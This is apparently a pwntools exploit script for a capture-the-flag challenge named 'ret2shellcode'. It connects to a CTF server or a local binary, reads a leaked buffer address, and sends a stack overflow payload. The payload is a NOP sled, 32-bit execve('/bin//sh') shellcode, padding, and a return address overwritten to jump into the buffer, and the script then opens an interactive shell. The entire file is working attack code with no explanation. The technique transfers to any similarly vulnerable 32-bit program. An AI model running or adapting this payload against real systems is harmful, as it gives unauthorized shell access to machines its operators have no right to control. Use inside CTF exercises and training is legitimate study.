from pwn import *
import argparse

def main():
    args = parsing()
    
    if args.local:
        proc = process("ret2shellcode")
    else:
        proc = remote("nc.ctf.unitedctf.ca", 4001)
    if args.debug:
        gdb.attach(proc, """b vuln""")

    print(proc.recvuntil(b"me: ").strip().decode())

    base = proc.recvline().strip().decode()
    print("--> base of buffer is:", base)
    
    print(proc.recvuntil(b"> ").strip().decode())

    nopsled = b"\x90"*(0x8c-23-20)
    # shellcode = b"\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80" # 34 bytes
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23 bytes
    junk = b"\x90"*20
    ret = p32(int(base, 16))
    
    payload = nopsled+shellcode+junk+ret
    print("--> payload: ", payload)
    
    proc.sendline(payload)
    proc.interactive()

def parsing():
    parser = argparse.ArgumentParser(description='Parse args')
    parser.add_argument('-d', '--debug', dest='debug', action='store_true',
                    help='Active debug mode')
    parser.add_argument('-l', '--local', dest='local', action='store_true',
                    help='Start local process')
    return parser.parse_args()

if __name__ == '__main__':
    main()
